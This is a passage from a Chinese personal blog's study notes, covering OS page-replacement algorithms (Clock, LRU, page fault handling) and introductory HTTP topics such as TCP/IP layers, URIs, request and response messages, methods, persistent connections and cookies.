<h3 id="The-Clock-PRA"><a href="#The-Clock-PRA" class="headerlink" title="The Clock  PRA"></a>The Clock  PRA</h3><p>原理相同, 只是改成循环, 改变指针来仿造队列移动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(指针到本页了)&#123;</span><br><span class="line">	if(referenceBit &#x3D;&#x3D; 0)</span><br><span class="line">		调出;</span><br><span class="line">	else &#123;</span><br><span class="line">		referenceBit &#x3D; 0;</span><br><span class="line">		指针后移;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125508.jpg" alt="clock"></p>
<h3 id="Least-Recently-Used-LRU-最近最少使用"><a href="#Least-Recently-Used-LRU-最近最少使用" class="headerlink" title="Least Recently Used (LRU, 最近最少使用)"></a>Least Recently Used (LRU, 最近最少使用)</h3><p>是NRU的升级版, 根据<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86/15572003?fr=aladdin" target="_blank" rel="noopener">程序局部性原理</a>, 最近被使用的往往将会再次被使用.</p>
<p>实现方式:</p>
<ol>
<li>建立一个最近使用页面的集合</li>
<li>在每个条目中保留计数器, 每次选择最低的(最少), 定期清零(最近)</li>
</ol>
<p><strong>模拟LRU</strong></p>
<h4 id="硬件模拟"><a href="#硬件模拟" class="headerlink" title="硬件模拟"></a>硬件模拟</h4><ul>
<li><p>当访问 n 时, 第 n 列置0 , 第 n 行其他位置1</p>
</li>
<li><p>当需要调出时, 调出每行和最少的, 如果相同, 调出….</p>
</li>
</ul>
<p>存疑: 不应该是调出离自己最远的吗.? 向下数的第一个?</p>
<p><strong>缺点</strong></p>
<p>开销大</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125518.jpg" alt="矩阵"></p>
<h4 id="软件模拟"><a href="#软件模拟" class="headerlink" title="软件模拟"></a>软件模拟</h4><ul>
<li>每个页都拥有自己的标识数,每个一段时间将访问的页面对应的标识数的某位置1, 其他置0, 位数后移</li>
<li>调出时选择标识值最小的调出</li>
</ul>
<h3 id="Working-Set"><a href="#Working-Set" class="headerlink" title="Working Set"></a>Working Set</h3><p>没听, 好像是把页面集中成集再调度</p>
<p>(了解)</p>
<h3 id="WSClock-PRA"><a href="#WSClock-PRA" class="headerlink" title="WSClock PRA"></a>WSClock PRA</h3><p>类似上面, 采用时钟模拟</p>
<p>(了解)</p>
<h2 id="其他需要考虑的"><a href="#其他需要考虑的" class="headerlink" title="其他需要考虑的"></a>其他需要考虑的</h2><h3 id="Local-vs-Global-Allocation-Policies"><a href="#Local-vs-Global-Allocation-Policies" class="headerlink" title="Local vs Global Allocation Policies"></a>Local vs Global Allocation Policies</h3><p>多进程并发时,内存中的页时统一调度还是只在该进程内部调度</p>
<p>全局调度页面会使得一段时间后内存的利用趋近于实际进程所需的比例.</p>
<p>(了解)</p>
<h3 id="Load-Control"><a href="#Load-Control" class="headerlink" title="Load Control"></a>Load Control</h3><p>当 <strong>PFF (page fault frequency 页面失效频率)</strong> 过高时, 主动减少使用内存的进程.</p>
<p><del>让一部分进程先跑起来</del></p>
<p>(了解)</p>
<h3 id="Page-Size"><a href="#Page-Size" class="headerlink" title="Page Size"></a>Page Size</h3><p>small page size (typically 4k or 8k):</p>
<p>Advantages:</p>
<ul>
<li>减少内部碎片</li>
<li>更好地适合各种数据结构和代码段</li>
<li>减少内存中未使用的程序</li>
</ul>
<p>Disadvantages:</p>
<ul>
<li>程序需要很多页，因此产生巨大的页表</li>
<li>传输小页所需的时间几乎与传输大页所需的时间相同, 但传输效率低</li>
</ul>
<p>(了解)</p>
<h3 id="Cleaning-Policy"><a href="#Cleaning-Policy" class="headerlink" title="Cleaning Policy"></a>Cleaning Policy</h3><p>为了保证在新进程创建的时候有足够的空白页面支持, 必须时刻保证内存中有足够的空白页.</p>
<p> <strong>paging daemon （分页守护进程）</strong>:当空白页面不足时, 会主动调出页, 但不调入页帧.</p>
<p>也可以使用clock</p>
<p>(了解)</p>
<h2 id="附-Page-Fault-Handling"><a href="#附-Page-Fault-Handling" class="headerlink" title="附: Page Fault Handling"></a>附: Page Fault Handling</h2><ol>
<li>trap 进内核, 保存PC</li>
<li>保存进程寄存器</li>
<li>OS 确定调入页</li>
<li>OS 确定调出页</li>
<li>若调出页修改过(dirty), 需要写入磁盘</li>
<li>调入调入页</li>
<li>更新页表</li>
<li>恢复到页面失效的指令</li>
<li>恢复进程</li>
<li>恢复寄存器, 恢复PC </li>
</ol>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a> </li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>操作系统之内存管理 (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>初窥HTTP之一_HTTP基础</title>
    <url>/2020/08/01/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%B8%80_HTTP%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<ol>
<li>TCP/IP 基础</li>
<li>HTTP简介</li>
</ol>
<a id="more"></a>
<h2 id="TCP-IP-基础"><a href="#TCP-IP-基础" class="headerlink" title="TCP/IP 基础"></a>TCP/IP 基础</h2><p>字面上看, TCP/IP包括了TCP与IP这两大协议．但一般意义上认为TCP/IP是指得以TCP,IP为核心协议的一系列协议族<del>(ko no IPS da!)</del>, 这个协议族是整个互联网运作的基础. HTTP协议是包含在TCP/IP协议族的一个子集.</p>
<blockquote>
<p>互联网协议套件（英语：Internet Protocol Suite，缩写IPS）是一个网络通讯模型，以及一整个网络传输协议家族，为网际网络的基础通讯架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP 。因为该协定家族的两个核心协定：TCP（传输控制协议）和IP（网际协议），为该家族中最早通过的标准。</p>
<p>协议还包括: ARP，IP，ICMP，UDP，TCP，DNS，HTTP，FTP , SMTP，POP3，SNMP，ECHO，DHCP，SSH，NNTP 等.</p>
<p>From: <a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F" target="_blank" rel="noopener">wiki: TCP/IP协议族</a></p>
</blockquote>
<p>本段将简单介绍:</p>
<ol>
<li>TCP/IP 的分层管理</li>
<li>通信传输流,</li>
<li>IP: 传输</li>
<li>TCP:可靠性</li>
<li>DNS: 域名解析</li>
<li>URI : 资源定位</li>
</ol>
<p>以及他们与HTTP是怎么互相协作的.本段不涉及具体的HTTP内容.</p>
<h3 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h3><p>假设你已经知道了 <a href="https://zh.wikipedia.org/zh-cn/OSI%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">OSI模型</a> 将信息传输分为七层, 他们依次是</p>
<ol>
<li>第7层 应用层</li>
<li>第6层 表达层</li>
<li>第5层 会话层</li>
<li>第4层 传输层</li>
<li>第3层 网络层</li>
<li>第2层 数据链路层</li>
<li>第1层 物理层</li>
</ol>
<p>TCP/IP协议簇(再次提醒并不是TCP与IP这两个协议) 将其简化成了四个层次:</p>
<ol>
<li><p>应用层, 对应OSI模型中的7~5层</p>
<blockquote>
<p>该层包括所有和应用程序协同工作，利用基础网络交换应用程序专用的数据的协议。数据从网络相关的程序以这种应用内部使用的格式进行传送，然后被编码成标准协议的格式。</p>
<p>包括<strong>HTTP</strong>（万维网服务）、<strong>FTP</strong>（文件传输）、<strong>SMTP</strong>（电子邮件）、<strong>SSH</strong>（安全远程登录）、<strong>DNS</strong>（名称&lt;-&gt; IP地址寻找）以及许多其他协议</p>
</blockquote>
</li>
<li><p>传输层, 对应OSI模型中的第4层</p>
<blockquote>
<p>解决诸如端到端可靠性（“数据是否已经到达目的地？”）和保证数据按照正确的顺序到达这样的问题。在TCP/IP协议组中，传输协议也包括所给数据应该送给哪个应用程序。</p>
<p>包括 TCP与UDP 协议等</p>
<blockquote>
<p>TCP : 是一个“可靠的”、面向链接, 基于字节流的传输机制</p>
<p>UDP: 是一个无链接的数据报协议。它是一个“尽力传递”（best effort）的协议, 因为它不检查数据包是否已经到达目的地，并且不保证它们按顺序到达。<del>但是快</del></p>
</blockquote>
</blockquote>
</li>
<li><p>网络互连层, 对应OSI模型中的第3层</p>
<blockquote>
<p>解决在网络上流动的数据包. 解决如何选取网络中的路径将数据从源网络传输到目的网络.</p>
<p>例如IP协议</p>
</blockquote>
</li>
<li><p>网络链路层, 对应OSI模型中的第1~2层</p>
<blockquote>
<p>用来处理连接网络的硬件部分, 包括控制操作系统, 硬件设备驱动, NIC(网络适配器, 即网卡) , 以及光纤等物理部分</p>
</blockquote>
</li>
</ol>
<h3 id="通信传输流"><a href="#通信传输流" class="headerlink" title="通信传输流"></a>通信传输流</h3><ol>
<li>首先作为发送端的客户端在应用层利用（http）发出一个想看某个Web页面的HTTP请求。</li>
<li>为了传输方便，在传输层把(TCP)从应用层传下来的数据进行分割，并在各个报文上打上标记序号及端口号发给网络层</li>
<li>在网络层(IP)，给数据加上作为通信目的地址的MAC地址后发给链路层。到此发送网络的通信请求就准备齐全了</li>
<li>接收端的服务器在链路层接收到数据，按序往上层发送，直到应用层。才算是真正接收到从客户端发送过来的HTTP请求</li>
</ol>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E9%80%9A%E4%BF%A1%E4%BC%A0%E8%BE%93%E6%B5%81.png" alt=""></p>
<p>发送端在层与层之间传输数据时，每经过一层必定会被打伤一个该层所属的首部信息。反之，接收端则会一层一层的去掉</p>
<h3 id="IP-传输"><a href="#IP-传输" class="headerlink" title="IP : 传输"></a>IP : 传输</h3><p><em><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wiki链接</a></em></p>
<p>网际协议（英语：Internet Protocol，缩写：IP；也称互联网协议）是用于分组交换数据网络的一种协议。</p>
<blockquote>
<p>IP是在TCP/IP协议族中网络层的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为IPv4，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署IPv6。</p>
</blockquote>
<p>要保证数据能够传输需要两个重要条件: IP地址与MAC地址.</p>
<p>MAC地址是烧录在网卡或者接口上的<strong>物理地址</strong>，具有二层意义和<strong>全球唯一性</strong>，一般不能被改变。IP地址是网络中的主机或者三层接口在网络中的<strong>逻辑地址</strong>，在<strong>同一个网络内具有唯一性</strong>。</p>
<p>IP地址通过ARP协议与MAC对应, IP地址是可变换的, MAC 地址是不变的.MAC 地址是杂乱无序的, 如果只是用MAC地址尽管可以传输但是造成浪费.(要从整个互联网中找到你这个MAC地址) , 使用IP地址则可以找到你所处的网络, 在从该网络设备转交给你. </p>
<p><a href="https://www.zhihu.com/question/49335649/answer/120746792" target="_blank" rel="noopener"><em>IP地址和 MAC地址的区别和联系是什么?</em></a></p>
<h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP : 可靠性"></a>TCP : 可靠性</h3><p><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener"><em>wiki链接</em></a></p>
<p>TCP提供了可靠的字节流服务. 字节流是指将大块数据分割更小块的<strong>报文段 </strong>(segment) 为单位进行传输. 并且能够将数据准确地传给对方, 并且确认数据的送达.</p>
<p>为了保证数据可靠地送达, TCP 使用了<strong>三次握手</strong>.其中使用了 TCP 的标志（flag): SYN（synchronize） 和 ACK(acknowledgement)</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E4%B8%89%E6%AC%A1%E6%8C%A5%E6%89%8B.png" alt=""></p>
<h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS : 域名解析"></a>DNS : 域名解析</h3><p><a href="https://zh.wikipedia.org/wiki/Domain_Name_System" target="_blank" rel="noopener"><em>Wiki链接</em></a></p>
<p><strong>DNS</strong>（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务，或逆向从IP地址反查域名的服务。</p>
<p>用户输入一个网址, 客户机首先向DNS请求IP地址, 获得后由HTTP协议生成针对目标服务器的 <em>请求报文</em> . TCP 将 请求报文分割成多个报文段并负责传输的可靠性. IP协议将这些报文段传送至指定的目标服务器. </p>
<p>服务器收到这些报文段后由TCP协议将报文段还原成HTTP的请求报文并检查完整性（如果出错再引起另外的处理), HTTP协议对请求报文进行处理, 并返回响应报文, 后续过程类似. </p>
<h3 id="URI-资源定位"><a href="#URI-资源定位" class="headerlink" title="URI : 资源定位"></a>URI : 资源定位</h3><p>统一资源标识符（英语：Uniform Resource Identifier，缩写：URI）在电脑术语中是一个用于标识某一互联网资源名称的字符串。</p>
<p>注意 : URI 是用字符串标识的某一互联网资源, 而URL是资源在互联网上的地址, URL是URI的子集.</p>
<p>通用URI的格式如下：</p>
<blockquote>
<p>[协议名]://用户名:密码@主机名:端口/路径?查询参数#片段ID</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    hierarchical part</span><br><span class="line">        ┌───────────────────┴─────────────────────┐</span><br><span class="line">                    authority               </span><br><span class="line">        ┌───────────────┴───────────────┐</span><br><span class="line">  abc:&#x2F;&#x2F;username:password@example.com:123&#x2F;path&#x2F;data?key&#x3D;value&amp;key2&#x3D;value2#fragid1</span><br><span class="line">  └┬┘   └───────┬───────┘ └────┬────┘ └┬┘ └───┬───┘ └─────────┬─────────┘ └──┬──┘</span><br><span class="line">scheme  user information     host     port  path            query         fragment</span><br><span class="line"> 协议	   	用户的登录信息		  服务器地址  端口	  路径		    查询参数		  片段ID</span><br><span class="line">  urn:example:mammal:monotreme:echidna</span><br><span class="line">  └┬┘ └──────────────┬───────────────┘</span><br><span class="line">scheme              path</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>协议方案</strong></p>
<p>使用<code>http:</code> 或<code>https：</code>等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号<code>：</code> . 也可使用<code>data：</code>或 <code>javascript：</code>这类指定数据或脚本程序的方案名。</p>
</li>
<li><p><strong>登录信息（认证）</strong></p>
</li>
</ul>
<p>​    指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项。</p>
<ul>
<li><strong>服务器地址</strong></li>
</ul>
<p>​    使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的Pv6地址名。</p>
<ul>
<li><strong>服务器端口</strong></li>
</ul>
<p>​    指定服务器连接的网络端口号。此项也是可选项，若用户省略则自动使用默认端口号。带层次的文件路径。指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p>
<ul>
<li><strong>带层次的文件路径</strong></li>
</ul>
<p>​    指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p>
<ul>
<li><strong>查询字符串</strong></li>
</ul>
<p>​    针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。</p>
<ul>
<li><p><strong>片段标识符</strong></p>
<p>使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个位置）。但在RFC中并没有明确规定其使用方法。该项也为可选项。</p>
</li>
</ul>
<hr>
<h2 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h2><p>本段将非常粗略地一览HTTP基本情况, 包括以下内容:</p>
<ol>
<li>HTTP基本情况</li>
<li>HTTP报文</li>
<li>HTTP方法与命令</li>
<li>持久连接</li>
<li>Cookie : 状态管理</li>
</ol>
<h3 id="HTTP基本情况"><a href="#HTTP基本情况" class="headerlink" title="HTTP基本情况"></a>HTTP基本情况</h3><p>HTTP协议用于客户端与服务端之间的通信. 客户端向服务端发出一个访问资源的<strong>请求</strong>, 服务端针对这个请求做出 <strong>响应</strong>. 服务端无法主动地向客户端建立通信.(除非附加了其他协议). 请求与响应都是通过HTTP报文来传送数据的.</p>
<p>计算机扮演客户端与服务端的角色可能会切换, 但对于每条通信线路二者的角色是确定的.</p>
<p>HTTP是<strong>无状态协议</strong>, HTTP协议自身对先前的通信状态不进行保存, 不进行持久化处理.这是为了快递处理大量事物,保证协议的可伸缩性.为了实现通信状态的保持状态, 引入了Cookie来实现持久化通信.</p>
<p>HTTP使用URI进行资源的定位, 指定URI的方式有很多:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 完整的请求URI</span><br><span class="line">GET http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">2. 使用相对URI地址</span><br><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br></pre></td></tr></table></figure>
<p>除此之外, 如果对于服务器本身(而不是访问资源)的请求, 可以只用<code>*</code>来代替请求URI</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS * HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>如前所述, HTTP是通过<strong>请求报文</strong>与<strong>响应报文</strong>进行信息传递的. </p>
<h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 5000</span><br><span class="line">If-Modified-Since: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line"></span><br><span class="line">name&#x3D;ueno&amp;age&#x3D;37</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>起始处的<code>GET</code> 表示向服务器请求的访问类型, 被称为 <strong>方法</strong>. 而后的字符串<code>/index.html</code> 是使用URI表示的请求访问的资源对象, 被称为 <strong>请求URI</strong>.  <code>HTTP/1.1</code> 是用于表明客户端使用的协议 的 <strong>协议版本号</strong>.</p>
<p>以上三个参数组成了请求报文的 <strong>请求行.</strong></p>
<p>后面的几行被称之为 <strong>请求首部字段</strong> (示例中2-6行), 存储了对请求的进一步要求. 最后接上 <strong>内容实体</strong> 的主体.(示例中8行及以后)</p>
<h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Http&#x2F;1.1 200 Ok</span><br><span class="line">Date: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line">Content-type:message&#x2F;http</span><br><span class="line">Content-Length: 1024</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>首行依次是 <strong>协议版本号</strong>, <strong>状态码</strong>, <strong>状态码的原因短语</strong>, 这一行被称作 <strong>状态行.</strong></p>
<p>后面几行被称为 <strong>响应首部字段</strong>, 最后被称为 <strong>资源实体</strong>的主体.</p>
<h3 id="HTTP方法与命令"><a href="#HTTP方法与命令" class="headerlink" title="HTTP方法与命令"></a>HTTP方法与命令</h3><p>下面介绍一些HTTP/1.1中的方法.</p>
<ul>
<li><p>GET：获取资源<br>GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGl（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。<br><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/GET.png" alt=""></p>
</li>
<li><p>POST：传输实体主体<br>POST方法用来传输实体的主体。虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽说POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/POST.png" alt=""></p>
</li>
<li><p>PUT：传输文件<br>PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。但是，鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST （REpresentational State Transfer，表征状态转移）标准的同类Web网站，就可能会开放使用PUT方法。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/PUT.png" alt=""></p>
</li>
<li><p>HEAD：获得报文首部<br>HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。 </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/HEAD.png" alt=""></p>
</li>
<li><p>DELETE：删除文件<br>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法。当配合Web应用程序的验证机制，或遵守REST标准时还是有可能会开放使用的。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/DELETE.png" alt=""></p>
</li>
<li><p>OPTIONS：询问支持的方法<br>OPTIONS方法用来查询针对请求URI指定的资源支持的方法</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/OPTIONS.png" alt=""></p>
</li>
<li><p>TRACE：追踪路径<br>TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接收到请求的服务器端则返回状态码200OK的响应。</p>
<p>客户端通过TRACE方法可以查询发送出去的请求是怎样被加工修改/篡改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转，TRACE方法就是用来确认连接过程中发生的一系列操作。但是，TRACE方法本来就不怎么常用，再加上它容易引发XST(Cross-Site Tracing，跨站追踪）攻击，通常就更不会用到了。 </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/TRACE.png" alt=""></p>
</li>
<li><p>CONNECT：要求用隧道协议连接代理<br>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/CONNECT.png" alt=""></p>
</li>
</ul>
<p>方法的名称区分大小写, 注意使用大写字母.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/ALL.png" alt=""></p>
<h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3><p>在最开始我们讲到通信建立前TCP协议需要进行三次握手, 此外在结束后还要进行四次挥手. 在HTTP协议的最初版本, 每进行一次通信就要重复执行上述步骤, 导致了大量资源的浪费. (例如一个网页中的多张图片均需要进行请求). 因此在/1.1版本中加入了<a href="https://zh.wikipedia.org/zh-hans/HTTP%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"> <strong>持久连接</strong> </a>的方法. 只要任意端没有主动断开连接, 则持续保持TCP的连接状态. </p>
<p>在 HTTP 1.1 中 所有的连接默认都是持续连接，除非特殊声明不支持。</p>
<h4 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h4><p><a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96" target="_blank" rel="noopener">HTTP管线化</a>（英语：HTTP pipelining）是将多个HTTP请求（request）整批提交的技术，而在发送过程中不需先等待服务器的回应。这是基于持久连接完成的.</p>
<h3 id="Cookie-状态管理"><a href="#Cookie-状态管理" class="headerlink" title="Cookie : 状态管理"></a>Cookie : 状态管理</h3><p>为了保留无状态协议的轻便性又解决状态保存的问题引入了Cookie技术. 通过在请求与响应报文中写入Cookie信息来控制客户端的状态.</p>
<p>Cookie 会根据从服务器端发送的响应报文内的一个叫做 <strong>Set-Cookie</strong> 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文1</span><br><span class="line">GET &#x2F;reader&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;响应报文</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">＜Set-Cookie: sid&#x3D;1342077140226724; path&#x3D;&#x2F;; expires&#x3D;Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文2</span><br><span class="line">GET &#x2F;image&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid&#x3D;1342077140226724</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Web开发</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>读书笔记:技术</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>初窥HTTP之二_HTTP报文</title>
    <url>/2020/08/03/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%BA%8C-HTTP%E6%8A%A5%E6%96%87/</url>
    <content><![CDATA[<p>HTTP 报文的信息 </p>
<p>HTTP 状态码</p>
<p>HTTP 首部(待完成)</p>
<a id="more"></a>
<h2 id="HTTP-报文的信息"><a href="#HTTP-报文的信息" class="headerlink" title="HTTP 报文的信息"></a>HTTP 报文的信息</h2><p>本段将介绍HTTP报文中包括有那些信息.包括:</p>
<ol>
<li>报文的结构</li>
<li>报文编码</li>
<li>多部分对象集合</li>
<li>范围传输</li>
<li>内容协商</li>
</ol>
<h3 id="报文结构"><a href="#报文结构" class="headerlink" title="报文结构"></a>报文结构</h3><p>HTTP报文是由多行数据构成的, 每行之间使用<code>CR+LF</code>(\r\n) 进行换行.</p>
<p>报文可被分为报文首部与报文主体, 后者并不是必须的.</p>
<p>报文首部包括:</p>
<ul>
<li>请求行 / 状态行</li>
<li>请求首部字段 / 响应首部字段</li>
<li>通用首部字段</li>
<li>实体首部字段</li>
<li>其他</li>
</ul>
<p><strong>请求行</strong></p>
<p>包括请求的方法, 请求URI, HTTP版本</p>
<p><strong>状态行</strong></p>
<p>包括响应的结果状态码, 原因短语, HTTP版本</p>
<p><strong>首部字段</strong></p>
<p>包括表示各种条件和属性的各类首部语句. 分为四种: </p>
<ol>
<li>请求首部字段(仅在请求报文中出现); </li>
<li>响应首部字段(仅在响应报文中出现); </li>
<li>通用首部字段; </li>
<li>实体首部字段;</li>
</ol>
<p><strong>其他</strong></p>
<p>其他未在RFC中定义的字段, 如Cookie</p>
<h3 id="报文编码"><a href="#报文编码" class="headerlink" title="报文编码"></a>报文编码</h3><p>对传输的数据进行编码可以提高传输速率, 但是编码与解码会消耗CPU资源.</p>
<h4 id="报文主体与实体主体"><a href="#报文主体与实体主体" class="headerlink" title="报文主体与实体主体"></a>报文主体与实体主体</h4><p>报文是HTTP实际传输的字节流. 报文包括报文首部与报文主体.(报文主体可以是0个或1个)</p>
<p>实体是作为请求或响应的有效载荷数据. 由实体首部与实体主体组成.</p>
